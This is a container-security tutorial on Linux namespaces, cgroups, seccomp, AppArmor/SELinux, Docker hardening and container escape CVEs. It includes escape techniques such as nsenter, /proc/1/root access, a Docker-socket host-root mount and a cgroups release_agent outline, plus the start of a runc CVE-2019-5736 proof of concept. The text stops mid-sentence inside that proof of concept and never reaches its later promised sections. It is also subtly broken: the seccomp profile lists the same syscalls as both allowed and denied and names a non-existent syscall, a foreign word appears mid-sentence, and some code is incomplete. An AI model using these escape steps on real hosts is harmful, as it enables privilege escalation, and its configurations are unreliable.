# Container Security Deep Dive

## Linux Isolation Primitives, Runtime Security, and Container Escape CVEs

---

## Table of Contents

1. [Linux Namespace Isolation Primitives](#1-linux-namespace-isolation-primitives)
2. [Control Groups (cgroups)](#2-control-groups-cgroups)
3. [Seccomp Profiles for Containers](#3-seccomp-profiles-for-containers)
4. [AppArmor and SELinux for Containers](#4-apparmor-and-selinux-for-containers)
5. [Docker Security Architecture](#5-docker-security-architecture)
6. [Container Runtime Security](#6-container-runtime-security)
7. [Rootless Containers and User Namespace Mapping](#7-rootless-containers-and-user-namespace-mapping)
8. [Container Image Security](#8-container-image-security)
9. [CVE-2019-5736: runc Container Escape](#9-cve-2019-5736-runc-container-escape)
10. [CVE-2022-0492: cgroups Escape](#10-cve-2022-0492-cgroups-escape)
11. [CVE-2022-0847: DirtyPipe Container Escape](#11-cve-2022-0847-dirtypipe-container-escape)
12. [Container Security Hardening Checklist](#12-container-security-hardening-checklist)

---

## 1. Linux Namespace Isolation Primitives

Containers are not virtual machines. They are Linux processes isolated by kernel namespace primitives. Understanding each namespace is essential for understanding both container security and container escape techniques.

### 1.1 Namespace Overview

Linux namespaces provide process-level isolation by giving a process a restricted view of system resources. There are eight namespaces in modern Linux kernels:

| Namespace | Isolated Resource | Kernel Version | Container Relevance |
|---|---|---|---|
| **PID** | Process IDs | 2.4.19 | Containers cannot see host processes |
| **Network** | Network stack | 2.4.19 | Containers get their own network interfaces |
| **Mount** | Filesystem mount points | 2.4.19 | Containers get their own filesystem hierarchy |
| **UTS** | Hostname and NIS domain | 2.6.19 | Containers get their own hostname |
| **IPC** | System V IPC, POSIX msg queues | 2.6.19 | Containers cannot use host IPC |
| **User** | User and group IDs | 3.8 | Containers can map host UIDs to container UIDs |
| **Cgroup** | Cgroup root directory view | 4.6 | Containers get their own cgroup hierarchy view |
| **Time** | Boot and monotonic clocks | 5.6 | Containers get their own clock offsets |

### 1.2 PID Namespace

The PID namespace isolates process ID numbers. Inside a container, PID 1 is the init process. On the host, that same process has a different PID.

```bash
# Inside a container:
PID   USER     TIME  COMMAND
1     root     0:00  nginx -g daemon off;
33    root     0:00  python app.py
50    www      0:00  worker process

# On the host:
PID   USER     TIME  COMMAND
...
4231  root     0:00  nginx -g daemon off;   # Same process as container PID 1
4287  root     0:00  python app.py           # Same process as container PID 33
4288  www      0:00  worker process          # Same process as container PID 50
```

**Security implications**:
- Container processes are visible on the host — no isolation from host-side `ps`
- If a container process escapes its namespace (e.g., via `nsenter` from the host), it can see all host PIDs
- PID namespace is hierarchical — child namespaces can see parent PIDs via `/proc` if not properly isolated

```c
// PID namespace creation (simplified)
// When Docker/runc creates a container, it uses clone() with CLONE_NEWPID flag

#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static int child_func(void *arg) {
    printf("Child PID inside namespace: %d\n", getpid());  // Will be 1
    printf("Parent PID inside namespace: %d\n", getppid()); // Will be 0
    return 0;
}

int main() {
    // CLONE_NEWPID creates a new PID namespace
    // The child process sees itself as PID 1
    pid_t pid = clone(child_func, stack_top, CLONE_NEWPID | SIGCHLD, NULL);
    printf("Child PID on host: %d\n", pid);  // Will be a host PID
    wait(NULL);
    return 0;
}
```

### 1.3 Network Namespace

The network namespace provides an isolated network stack — interfaces, routing tables, firewall rules, and ports.

```
+------------------------------------------------------------------+
|                     Host Network Namespace                        |
|  +------------+  +------------+  +------------+  +------------+ |
|  |   eth0     |  |   docker0  |  |   veth1    |  |   veth2    | |
|  | 10.0.0.5   |  | 172.17.0.1 |  | veth1      |  | veth2      | |
|  +------------+  +----+-------+  +----+-------+  +----+-------+ |
|                        |              |              |           |
+------------------------------------------------------------------+
                         |              |              |
       +-----------------+              |              |
       |                                |              |
+------------------------------------------------------------------+
|  Container 1 Network Namespace      |              |              |
|  +------------+                     |              |              |
|  |   eth0     |<---+               |              |              |
|  | 172.17.0.2 |    |               |              |              |
|  +------------+    |          +----+-------+  +----+-------+     |
|                    |          | veth1@if2  |  | veth2@if2  |     |
+------------------------------------------------------------------+
                                      ^
                                      |
+------------------------------------------------------------------+
|  Container 2 Network Namespace                                    |
|  +------------+                                                    |
|  |   eth0     |<---+                                               |
|  | 172.17.0.3 |                                                    |
|  +------------+                                                    |
+------------------------------------------------------------------+
```

```bash
# Create and configure a network namespace
ip netns add container-ns

# Create a veth pair (one end in host, one in namespace)
ip link add veth-host type veth peer name veth-container

# Move container end into the namespace
ip link set veth-container netns container-ns

# Configure the namespace
ip netns exec container-ns ip addr add 172.16.0.2/24 dev veth-container
ip netns exec container-ns ip link set veth-container up
ip netns exec container-ns ip route add default via 172.16.0.1

# Security implications:
# - Network namespace does NOT provide network-level security on its own
# - iptables rules inside the namespace are isolated from the host
# - But: Docker's default bridge networking allows inter-container communication
#   unless ICC (Inter-Container Communication) is disabled
# - CNI plugins (Calico, Cilium, Flannel) provide network policy enforcement
```

### 1.4 Mount Namespace

The mount namespace isolates filesystem mount points. This is the foundation of container filesystem isolation, but it has subtle security implications:

```bash
# Docker's mount namespace configuration for a container:
# 1. The container sees a minimal root filesystem (from the container image)
# 2. The host's /proc, /sys, /dev are bind-mounted or emulated
# 3. Docker layers (overlayfs) present a unified filesystem view

# INSIDE CONTAINER (mount namespace isolated):
/ # mount
overlay on / type overlay (lowerdir=/var/lib/docker/overlay2/...,upperdir=...,workdir=...)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
sysfs on /sys type sysfs (ro,nosuid,nodev,noexec,relatime)

# Security implications of mount namespace:
# 1. If /proc is mounted from host (not namespace), /proc/1/root gives host filesystem
# 2. If host / is bind-mounted into container, full host access
# 3. Shared subtrees (MS_SHARED) can propagate mounts from containers to host
# 4. Docker uses pivot_root + mount namespace to isolate the container root
```

### 1.5 User Namespace

The user namespace is the most security-relevant namespace. It maps container UIDs to host UIDs, enabling rootless containers:

```bash
# User namespace mapping:
# Container UID 0 (root) → Host UID 100000
# Container UID 1 → Host UID 100001
# ...
# Container UID 65535 → Host UID 165535

# /etc/subuid and /etc/subgid configure these mappings:
# /etc/subuid:
t:100000:65536

# /etc/subgid:
t:100000:65536

# This means user 't' can map container UIDs 0-65535 to host UIDs 100000-165535
# A process that is root (UID 0) inside the container is UID 100000 on the host
# This provides a critical security boundary:
# - Container root has no host-level privileges
# - Even if the container escapes, the process has limited host permissions
```

**Cross-reference**: The User namespace maps directly to the Linux Kernel track's discussion of `user_namespace` capability interactions (see `linux_kernel/docs/02a_vuln_classes.md`). A process in a user namespace that has all capabilities within that namespace has **no capabilities** in the parent (host) namespace.

### 1.6 Namespace Escape Techniques

```bash
# Technique 1: nsenter from host (requires CAP_SYS_ADMIN on host)
nsenter --target <container-pid-on-host> --mount --uts --ipc --net --pid -- \
  /bin/bash

# Technique 2: /proc/<pid>/root (requires access to host /proc)
# If container can see host PIDs (no PID namespace or /proc leak)
ls -la /proc/1/root
# This gives access to the host filesystem if PID namespace is broken

# Technique 3: /proc/<pid>/ns/* symlink following
# If /proc is mounted from host:
ls -la /proc/1/ns/
# mnt -> mnt:[4026531840]  (host mount namespace)
# net -> net:[4026531992]  (host network namespace)
# setns() into these namespaces gives full host namespace access

# Technique 4: Shared mount subtrees
# If container mount propagation is MS_SHARED:
mount --make-shared /mnt
# Then a mount event in container propagates to host
```

---

## 2. Control Groups (cgroups)

### 2.1 cgroups v1 vs v2

cgroups limit and account for resource usage (CPU, memory, I/O) for process groups. Understanding cgroups is critical because they are both a security boundary and an attack surface.

```
+------------------------------------------------------------------+
|                    cgroups v1 Hierarchy                           |
|                                                                    |
|  /sys/fs/cgroup/                                                  |
|    ├── blkio/          (Block I/O limiting)                       |
|    ├── cpu/            (CPU usage accounting)                      |
|    ├── cpuacct/        (CPU accounting)                            |
|    ├── cpuset/         (CPU affinity)                              |
|    ├── devices/        (Device access control)                    |
|    ├── freezer/        (Process freezing)                          |
|    ├── hugetlb/        (Huge page usage)                          |
|    ├── memory/         (Memory limiting)                           |
|    ├── net_cls/        (Network classid)                           |
|    ├── net_prio/       (Network priority)                          |
|    ├── perf_event/     (Performance monitoring)                   |
|    ├── pids/           (PID limiting)                              |
|    └── systemd/        (Systemd integration)                       |
|                                                                    |
|  Each subsystem has independent hierarchy → complex management    |
+------------------------------------------------------------------+

+------------------------------------------------------------------+
|                    cgroups v2 Hierarchy                           |
|                                                                    |
|  /sys/fs/cgroup/                                                  |
|    ├── cgroup.controllers      (available controllers)            |
|    ├── cgroup.procs            (processes in cgroup)               |
|    ├── cgroup.subtree_control  (enabled controllers for children) |
|    ├── docker/                                                  |
|    │   ├── cgroup.procs                                         |
|    │   ├── memory.max                                            |
|    │   ├── cpu.max                                                |
|    │   └── container1/                                          |
|    │       ├── cgroup.procs                                      |
|    │       └── ...                                               |
|    └── kubepods/                                                 |
|        ├── pod12345/                                            |
|        │   ├── cgroup.procs                                      |
|        │   └── container-xyz/                                   |
|        └── ...                                                   |
|                                                                    |
|  Unified hierarchy → simpler management, better delegation        |
+------------------------------------------------------------------+
```

### 2.2 cgroups as Attack Surface

```bash
# CVE-2022-0492: cgroups v1 release_notification bypass
# This CVE allows a container process to escape the cgroups device restriction
# by creating a new cgroup with release_notification pointing to a host binary.
#
# Attack overview:
# 1. Container process has CAP_SYS_ADMIN in its user namespace (not on host)
# 2. cgroups v1 allows non-root processes to create sub-cgroups
# 3. The release_notification feature executes a binary when all processes
#    leave a cgroup
# 4. By writing to /sys/fs/cgroup/<subsystem>/notify_on_release and
#    /sys/fs/cgroup/<subsystem>/release_agent, an attacker can execute
#    arbitrary commands on the host as root

# Check if cgroups v1 is in use (vulnerable):
cat /proc/filesystems | grep cgroup
# nodev  cgroup  ← cgroups v1 (potentially vulnerable)
# nodev  cgroup2 ← cgroups v2 (not vulnerable to this specific CVE)

# Check if the container has write access to cgroups:
ls -la /sys/fs/cgroup/memory/
# If writable, the container may be able to modify release_agent
```

---

## 3. Seccomp Profiles for Containers

### 3.1 Seccomp Architecture

seccomp (secure computing mode) restricts the system calls a process can make. It is a critical component of container security that limits the kernel attack surface exposed to container processes.

```
+------------------------------------------------------------------+
|                      Seccomp Architecture                          |
|                                                                    |
|  Container Process                                                 |
|       |                                                            |
|       | System call (e.g., openat, execve, connect)               |
|       v                                                            |
|  +------------------------------------------------------------+   |
|  |                    Seccomp Filter (BPF)                     |   |
|  |                                                              |   |
|  |  Rule: openat → ALLOW                                       |   |
|  |  Rule: mount → KILL (SIGSYS)                                |   |
|  |  Rule: keyctl → ERRNO(EPERM)                                |   |
|  |  Rule: ptrace → KILL                                         |   |
|  |  ...                                                          |   |
|  +------------------------------------------------------------+   |
|       |                                                            |
|       | Allowed syscalls only                                      |
|       v                                                            |
|  +------------------------------------------------------------+   |
|  |                    Linux Kernel                              |   |
|  +------------------------------------------------------------+   |
+------------------------------------------------------------------+
```

### 3.2 Default Docker Seccomp Profile

Docker's default seccomp profile blocks approximately 44 system calls out of ~300+ available on x86_64 Linux:

```json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "architectures": ["SCMP_ARCH_X86_64", "SCMP_ARCH_X86", "SCMP_ARCH_AARCH64"],
  "syscalls": [
    {
      "names": [
        "accept", "accept4", "access", "alarm", "bind", "brk", "capget",
        "capset", "chdir", "chmod", "chown", "chown32", "clock_getres",
        "clock_gettime", "clock_nanosleep", "close", "connect", "copy_file_range",
        "creat", "dup", "dup2", "dup3", "epoll_create", "epoll_create1",
        "epoll_ctl", "epoll_op", "epoll_wait", "eventfd", "eventfd2",
        "execve", "execveat", "exit", "exit_group", "faccessat", "fadvise64",
        "fadvise64_64", "fallocate", "fanotify_mark", "fchdir", "fchmod",
        "fchmodat", "fchown", "fchown32", "fchownat", "fcntl", "fcntl64",
        "fdatasync", "fgetxattr", "flistxattr", "flock", "fork", "fremovexattr",
        "fsetxattr", "fstat", "fstat64", "fstatat64", "fstatfs", "fstatfs64",
        "fsync", "ftruncate", "ftruncate64", "futex", "futimesat", "getcwd",
        "getdents", "getdents64", "getegid", "getegid32", "geteuid", "geteuid32",
        "getgid", "getgid32", "getgroups", "getgroups32", "getitimer",
        "getpeername", "getpgid", "getpgrp", "getpid", "getppid", "getpriority",
        "getrandom", "getresgid", "getresgid32", "getresuid", "getresuid32",
        "getrlimit", "getsockname", "getsockopt", "gettid", "gettimeofday",
        "getuid", "getuid32", "getxattr", "inotify_add_watch", "inotify_init",
        "inotify_init1", "inotify_rm_watch", "ioctl", "lchown", "lchown32",
        "lgetxattr", "link", "linkat", "listen", "listxattr", "llistxattr",
        "lremovexattr", "lseek", "lsetxattr", "lstat", "lstat64", "madvise",
        "membarrier", "memfd_create", "mincore", "mkdir", "mkdirat", "mknod",
        "mknodat", "mlock", "mlock2", "mlockall", "mmap", "mmap2", "mprotect",
        "mq_getsetattr", "mq_notify", "mq_open", "mq_timedreceive",
        "mq_timedsend", "mq_unlink", "mremap", "msgctl", "msgget", "msgrcv",
        "msgsnd", "msync", "munlock", "munlockall", "munmap", "nanosleep",
        "newfstatat", "open", "openat", "pause", "pipe", "pipe2", "poll",
        "ppoll", "prctl", "pread64", "preadv", "prlimit64", "pselect6",
        "pwrite64", "pwritev", "read", "readahead", "readlink", "readlinkat",
        "recvfrom", "recvmmsg", "recvmsg", "removexattr", "rename", "renameat",
        "renameat2", "restart_syscall", "rmdir", "rt_sigaction", "rt_sigprocmask",
        "rt_sigreturn", "rt_sigsuspend", "sched_getaffinity", "sched_yield",
        "seccomp", "select", "sendfile", "sendfile64", "sendmmsg", "sendmsg",
        "sendto", "set_robust_list", "set_thread_area", "set_tid_address",
        "setgroups", "setgroups32", "setitimer", "setpgid", "setpriority",
        "setrlimit", "setsid", "setsockopt", "setxattr", "shutdown", "sigaltstack",
        "signalfd", "signalfd4", "socket", "socketpair", "splice", "stat",
        "stat64", "statfs", "statfs64", "symlink", "symlinkat", "sync",
        "sync_file_range", "syncfs", "sysinfo", "tee", "tgkill", "time",
        "timer_create", "timer_delete", "timer_getoverrun", "timer_gettime",
        "timer_settime", "timerfd_create", "timerfd_gettime", "timerfd_settime",
        "times", "tkill", "truncate", "truncate64", "umask", "uname", "unlink",
        "unlinkat", "unshare", "utime", "utimensat", "utimes", "vfork",
        "vmsplice", "wait4", "waitid", "waitpid", "write", "writev"
      ],
      "action": "SCMP_ACT_ALLOW"
    },
    {
      "names": [
        "keyctl", "add_key", "request_key",
        "bpf", "userfaultfd", "memfd_create",
        "clock_settime", "mount", "umount2", "pivot_root",
        "bdflush", "io_setup", "io_destroy", "io_getevents", "io_submit", "io_cancel",
        "ioperm", "iopl", "swapoff", "swapon",
        "syslog", "vhangup", "reboot",
        "nfsservctl", "setup", "perf_event_open",
        "ptrace", "kcmp", "finit_module", "delete_module",
        "init_module", "seccomp", "acct"
      ],
      "action": "SCMP_ACT_ERRNO"
    }
  ]
}
```

### 3.3 Seccomp Bypass Techniques

```bash
# Bypass 1: Use allowed syscalls to achieve blocked functionality
# If mount() is blocked but openat() + write() are allowed:
#   Write to /etc/passwd via openat + write (if /etc/passwd is in container)
#   This only affects the container filesystem, not the host

# Bypass 2: io_uring
# If io_uring syscalls are allowed, they can be used to invoke
# blocked syscalls indirectly:
# io_uring_submit with IORING_OP_OPENAT can bypass seccomp
# if io_uring_setup and io_uring_enter are allowed

# Bypass 3: Seccomp profile misconfiguration
# Common misconfiguration: running containers with --privileged disables seccomp!
docker run --privileged -it alpine sh
# This completely disables seccomp, AppArmor, and capability dropping

# Bypass 4: Kernel vulnerabilities
# If the kernel has a vulnerability that allows arbitrary code execution
# in kernel context, seccomp can be bypassed since it only filters
# system calls from userland
```

---

## 4. AppArmor and SELinux for Containers

### 4.1 AppArmor for Docker

AppArmor provides mandatory access control (MAC) that supplements seccomp and capabilities. Docker can load custom AppArmor profiles:

```bash
# Docker's default AppArmor profile (docker-default)
# Located at: /etc/apparmor.d/docker
# Key restrictions:
# - Deny mount operations
# - Deny access to /proc/sys, /sys/firmware, /sys/devices
# - Deny ptrace
# - Allow read/write to container filesystem
# - Allow network operations

# View the current AppArmor profile for a container:
aa-status | grep docker

# Create a custom AppArmor profile for a container:
cat > /etc/apparmor.d/docker-custom << 'EOF'
#include <abstractions/base>
#include <abstractions/nameservice>

profile docker-custom flags=(attach_disconnected,mediate_deleted) {
  #include <abstractions/base>

  # Network: allow TCP/UDP outbound, deny incoming
  network inet tcp,
  network inet udp,
  network inet icmp,
  deny network inet6,
  
  # Filesystem: allow read-only access to most system directories
  /etc/** r,
  /usr/** r,
  /lib/** r,
  /proc/** r,
  
  # Deny write to critical directories
  deny /etc/** w,
  deny /usr/** w,
  deny /proc/sys/** w,
  deny /sys/** w,
  
  # Allow write to application directories
  /app/** rw,
  /tmp/** rw,
  /var/log/** rw,
  
  # Deny access to sensitive files
  deny /etc/shadow r,
  deny /root/** rw,
  deny /home/** rw,
}
EOF

# Load the profile
apparmor_parser -r /etc/apparmor.d/docker-custom

# Run a container with the custom profile
docker run --security-opt apparmor=docker-custom -it alpine sh
```

### 4.2 SELinux for Containers (RHEL/CentOS/Fedora)

SELinux provides a different MAC model based on type enforcement. In the container context, it uses Multi-Category Security (MCS) labels to隔离 containers from each other:

```bash
# SELinux labels for containers
# Format: user:role:type:level
# Example: system_u:system_r:container_t:s0:c100,c200

# container_t - the type for container processes
# container_file_t - the type for container files
# The MCS level (s0:c100,c200) isolates containers from each other

# View SELinux labels on container files:
ls -Z /var/lib/docker/overlay2/*/merged/
# system_u:object_r:container_file_t:s0:c512,c768

# View SELinux context of running container:
docker inspect <container-id> --format='{{.ProcessLabel}}'
# system_u:system_r:container_t:s0:c100,c200

# SELinux enforcement prevents:
# 1. Container process (container_t) from accessing host files (etc_t, var_t, etc.)
# 2. One container (s0:c100,c200) from accessing another container's files (s0:c300,c400)
# 3. Container process from loading kernel modules (modules_object_t)
# 4. Container process from accessing KVM devices (kvm_device_t)

# Key container SELinux types:
# container_t      - Container process type
# container_file_t - Container file type
# container_share_t - Shared container content
# container_log_t  - Container log files
# container_var_lib_t - Container variable data
```

---

## 5. Docker Security Architecture

### 5.1 Docker Security Layers

```
+------------------------------------------------------------------+
|                    Docker Security Stack                          |
|                                                                    |
|  +------------------------------------------------------------+   |
|  | Layer 6: Image Security (signed images, vulnerability scan)|   |
|  +------------------------------------------------------------+   |
|  +------------------------------------------------------------+   |
|  | Layer 5: Runtime Security (seccomp, AppArmor, capabilities) |   |
|  +------------------------------------------------------------+   |
|  +------------------------------------------------------------+   |
|  | Layer 4: Namespace Isolation (PID, net, mnt, user, etc.)   |   |
|  +------------------------------------------------------------+   |
|  +------------------------------------------------------------+   |
|  | Layer 3: cgroup Resource Limits (CPU, memory, I/O, pids)   |   |
|  +------------------------------------------------------------+   |
|  +------------------------------------------------------------+   |
|  | Layer 2: Docker Daemon Security (TLS, user namespace)       |   |
|  +------------------------------------------------------------+   |
|  +------------------------------------------------------------+   |
|  | Layer 1: Host OS Security (kernel patches, SELinux)         |   |
|  +------------------------------------------------------------+   |
+------------------------------------------------------------------+
```

### 5.2 Docker Daemon Security

```bash
# The Docker daemon (dockerd) runs as root and has full access to the host kernel.
# This means anyone who can talk to the Docker socket has root-level access.

# Attack: Access to Docker socket = root on host
# If /var/run/docker.sock is accessible to non-root users:
docker run -v /:/host -it alpine chroot /host
# This mounts the entire host filesystem inside the container and gives root shell

# Secure Docker daemon configuration:
# 1. Run dockerd with TLS
dockerd --tlsverify --tlscacert=/etc/docker/ca.pem \
  --tlscert=/etc/docker/server-cert.pem \
  --tlskey=/etc/docker/server-key.pem \
  -H=0.0.0.0:2376

# 2. Enable user namespace remapping
# /etc/docker/daemon.json:
{
  "userns-remap": "default",
  "storage-driver": "overlay2",
  "live-restore": true,
  "userland-proxy": false,
  "no-new-privileges": true
}

# 3. Use rootless Docker
# Rootless Docker runs the entire Docker daemon as a non-root user
# using user namespaces for isolation
dockerd-rootless.sh --experimental
```

### 5.3 Docker Capabilities

Linux capabilities divide root's powers into discrete units that can be independently granted or denied:

```bash
# Default Docker capabilities (dropped from root):
# Docker drops all capabilities by default and then adds back a specific set:
# CAP_CHOWN, CAP_DAC_OVERRIDE, CAP_FSETID, CAP_FOWNER,
# CAP_MKNOD, CAP_NET_RAW, CAP_SETGID, CAP_SETUID,
# CAP_SETFCAP, CAP_SETPCAP, CAP_NET_BIND_SERVICE,
# CAP_SYS_CHROOT, CAP_KILL, CAP_AUDIT_WRITE

# Dangerous capabilities that should NOT be added:
# CAP_SYS_ADMIN   - Mount filesystems, modify cgroups, set hostname
# CAP_SYS_PTRACE  - Trace processes, inject code
# CAP_SYS_MODULE  - Load kernel modules
# CAP_NET_ADMIN   - Modify network configuration, iptables
# CAP_DAC_READ_SEARCH - Bypass file read permissions
# CAP_LINUX_IMMUTABLE - Set immutable flag on files
# CAP_SYS_BOOT    - Reboot the system

# Running a container with all capabilities (DANGEROUS):
docker run --privileged -it alpine sh
# This is equivalent to running the process as root on the host!

# Running with specific capabilities added:
docker run --cap-add=NET_ADMIN --cap-drop=ALL -it alpine sh

# Running with no-new-privileges (prevents capability escalation):
docker run --security-opt no-new-privileges -it alpine sh
```

---

## 6. Container Runtime Security

### 6.1 Container Runtime Comparison

| Feature | Docker (runc) | containerd | CRI-O | Kata Containers |
|---|---|---|---|---|
| **OCI Runtime** | runc | runc / Kata | runc / Kata | kata-runtime |
| **Isolation** | Namespaces/cgroups | Same as Docker | Same as Docker | VM isolation |
| **Rootless** | Partial (rootless mode) | Yes | Partial | N/A (VM) |
| **CRI Compatible** | No (uses dockershim) | Yes | Yes | Yes |
| **Default Seccomp** | Yes | Yes | Yes | Yes |
| **Attack Surface** | runc / Docker daemon | containerd shim | CRI-O daemon | Hypervisor |

### 6.2 containerd Security

```
+------------------------------------------------------------------+
|                    containerd Architecture                        |
|                                                                    |
|  kubelet ← CRI → containerd                                      |
|                       |                                            |
|                       v                                            |
|  +------------------+                                              |
|  | containerd       |                                              |
|  | (gRPC API)       |                                              |
|  +------------------+                                              |
|       |          |                                                  |
|       v          v                                                  |
|  +---------+  +---------+  +---------+                             |
|  |  shim   |  |  shim   |  |  shim   |                             |
|  | (runc)  |  | (runc)  |  | (Kata)  |                             |
|  +---------+  +---------+  +---------+                             |
|       |          |             |                                    |
|       v          v             v                                    |
|  Container    Container      Micro-VM                             |
|  (namespaces) (namespaces)  (VM isolation)                        |
+------------------------------------------------------------------+
```

### 6.3 CRI-O Security

CRI-O is a lightweight container runtime specifically designed for Kubernetes:

```toml
# CRI-O configuration: /etc/crio/crio.conf

[crio]
# Default capabilities (similar to Docker's default set)
default_capabilities = [
  "CAP_CHOWN",
  "CAP_DAC_OVERRIDE",
  "CAP_FSETID",
  "CAP_FOWNER",
  "CAP_MKNOD",
  "CAP_NET_RAW",
  "CAP_SETGID",
  "CAP_SETUID",
  "CAP_SETFCAP",
  "CAP_SETPCAP",
  "CAP_NET_BIND_SERVICE",
  "CAP_SYS_CHROOT",
  "CAP_KILL"
]

# Seccomp profile path
seccomp_profile = "/etc/crio/seccomp.json"

# AppArmor profile
apparmor_profile = "crio-default"

# Drop ALL capabilities then add specific ones
# Using capabilities drop list for defense in depth
drop_capabilities = ["CAP_SYS_ADMIN", "CAP_NET_ADMIN"]

[crio.runtime]
# Conmon (container monitor) configuration
conmon = "/usr/bin/conmon"
conmon_cgroup = "system.slice"

[crio.image]
# Image signing and verification
signature_policy = "/etc/crio/policy.json"
```

---

## 7. Rootless Containers and User Namespace Mapping

### 7.1 Rootless Docker Architecture

```
+------------------------------------------------------------------+
|                    Rootless Container Architecture                 |
|                                                                    |
|  Host (UID mapping)                                               |
|  +------------------------------------------------------------+   |
|  |  Host UID 100000 (mapped from container root)               |   |
|  |  Host UID 100001 (mapped from container UID 1)             |   |
|  |  ...                                                         |   |
|  |  Host UID 165535 (mapped from container UID 65535)          |   |
|  +------------------------------------------------------------+   |
|                                                                    |
|  Container (User Namespace)                                       |
|  +------------------------------------------------------------+   |
|  |  Container UID 0 (root) → Host UID 100000                   |   |
|  |  Container UID 1 → Host UID 100001                          |   |
|  |  ...                                                         |   |
|  |  Container UID 65535 → Host UID 165535                      |   |
|  +------------------------------------------------------------+   |
|                                                                    |
|  Security Properties:                                              |
|  - Container root (UID 0) has NO privileges on host              |
|  - Container process cannot mknod, mount, or modify host /etc    |
|  - Even if container escapes, attacker is UID 100000 on host     |
|  - User namespace nesting provides defense in depth              |
+------------------------------------------------------------------+
```

### 7.2 Rootless Container Configuration

```bash
# Enable rootless Docker
# Prerequisites:
# 1. Kernel >= 4.18 (for user namespace support)
# 2. /etc/subuid and /etc/subgid configured
# 3. shadow-utils with newuidmap/newgidmap

# /etc/subuid:
username:100000:65536

# /etc/subgid:
username:100000:65536

# Enable unprivileged user namespaces:
sysctl -w kernel.unprivileged_userns_clone=1

# Install rootless Docker:
curl -fsSL https://get.docker.com/rootless | sh

# Rootless Docker runs as the user, not root:
# The Docker daemon (dockerd) runs as UID 1000 instead of root
# All containers run inside user namespaces
# No root privileges are required on the host

# Podman rootless containers (alternative):
podman run --rm -it alpine sh
# Podman rootless uses user namespaces by default
# No daemon required
```

---

## 8. Container Image Security

### 8.1 Image Security Concerns

| Concern | Description | Mitigation |
|---|---|---|
| **Base image vulnerabilities** | Known CVEs in the base OS layer | Regular scanning, minimal base images |
| **Embedded secrets** | Credentials in image layers | Multi-stage builds, secret managers |
| **Image tampering** | Supply chain attacks on images | Image signing (cosign/notation) |
| **Excessive privileges** | Running as root in Dockerfile | USER directive, non-root images |
| **Unnecessary packages** | Attack surface from extra packages | Distroless/scratch images |
| **Stale images** | Unpatched vulnerabilities | Image update policies, renovate |

### 8.2 Dockerfile Security Best Practices

```dockerfile
# BAD: Insecure Dockerfile
FROM ubuntu:latest                    # 1. Full OS image (large attack surface)
RUN apt-get update && apt-get install -y python3  # 2. Unpinned package versions
# 3. Running as root (default)
COPY . /app                           # 4. Copying everything including .git
COPY config.json /app/                # 5. Hardcoded secrets
RUN pip install -r requirements.txt   # 6. Unpinned Python dependencies
EXPOSE 8080
CMD ["python3", "app.py"]

# GOOD: Secure Dockerfile
FROM gcr.io/distroless/python3:latest AS runtime  # 1. Distroless base (minimal attack surface)
# 2. Multi-stage build to separate build and runtime
FROM python:3.11-slim AS builder
WORKDIR /build
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt  # 3. Pinned requirements

FROM runtime
COPY --from=builder /usr/local/lib/python3.11/site-packages /usr/local/lib/python3.11/site-packages
COPY --chown=1000:1000 app.py /app/  # 4. Non-root file ownership
USER 1000:1000                        # 5. Run as non-root user
EXPOSE 8080
HEALTHCHECK --interval=30s CMD ["python3", "-c", "import urllib.request; urllib.request.urlopen('http://localhost:8080/healthz')"]
CMD ["python3", "/app/app.py"]
```

### 8.3 Container Image Signing

```bash
# cosign (part of Sigstore) - container image signing and verification

# Generate a key pair:
cosign generate-key-pair

# Sign an image:
cosign sign --key cosign.key myregistry.io/myapp:v1.0.0

# Verify an image signature:
cosign verify --key cosign.pub myregistry.io/myapp:v1.0.0

# Keyless signing with Sigstore (uses OIDC identity):
cosign sign --keyless myregistry.io/myapp:v1.0.0

# Verify keyless signature:
cosign verify myregistry.io/myapp:v1.0.0 \
  --certificate-identity=developer@company.com \
  --certificate-oidc-issuer=https://github.com/login/oauth

# SBOM (Software Bill of Materials) generation and attachment:
syft myregistry.io/myapp:v1.0.0 -o spdx-json > sbom.json
cosign attach sbom --sbom sbom.json myregistry.io/myapp:v1.0.0

# Vulnerability scanning with Grype:
grype myregistry.io/myapp:v1.0.0

# Policy enforcement with Kyverno (Kubernetes):
# Verify image signature before allowing pod creation
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: verify-image-signature
spec:
  validationFailureAction: Enforce
  rules:
  - name: verify-signature
    match:
      any:
      - resources:
          kinds:
          - Pod
    verifyImages:
    - imageReferences:
      - "myregistry.io/*"
      attestors:
      - entries:
        - keys:
            publicKeys: |-
              -----BEGIN PUBLIC KEY-----
              ...
              -----END PUBLIC KEY-----
```

---

## 9. CVE-2019-5736: runc Container Escape

### 9.1 Vulnerability Overview

| Field | Detail |
|---|---|
| **CVE** | CVE-2019-5736 |
| **Severity** | CVSS 9.9 (Critical) |
| **Affected** | runc < 1.0-rc6 (Docker < 18.09.2) |
| **Type** | Host file descriptor leak leading to container escape |
| **Root Cause** | runc opens `/proc/self/exe` inside the container context |

### 9.2 Technical Deep Dive

When `runc exec` runs a command inside a container, it needs to re-execute itself inside the container's namespaces. To do this, it opens `/proc/self/exe` (which points to the runc binary on the host) inside the container's mount namespace.

```c
// Simplified vulnerable code in runc (libcontainer/nsinit/init.c)
// When runc exec enters a container:

// 1. runc opens its own binary via /proc/self/exe
//    This file descriptor points to the runc binary ON THE HOST
//    But it is opened inside the container's mount namespace

// 2. The fd leaks into the container process
//    The container process can write to this fd, overwriting
//    the runc binary on the host

// 3. When the host's runc is next executed (e.g., docker exec),
//    the attacker's code runs as root on the host
```

### 9.3 Exploitation Walkthrough

```c
// attacker.c — POC for CVE-2019-5736
// This code runs inside a malicious container

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>

int main() {
    // Step 1: Replace /bin/sh with a symlink to /proc/self/exe
    // This causes runc to open ITSELF when it reads the shell binary
    unlink("/bin/sh");
    symlink("/proc/self/exe", "/bin/sh");
    
    // Step 2: Wait for the host to run `docker exec <container-id> sh`
    // When runc opens /bin/sh inside the container, it actually opens
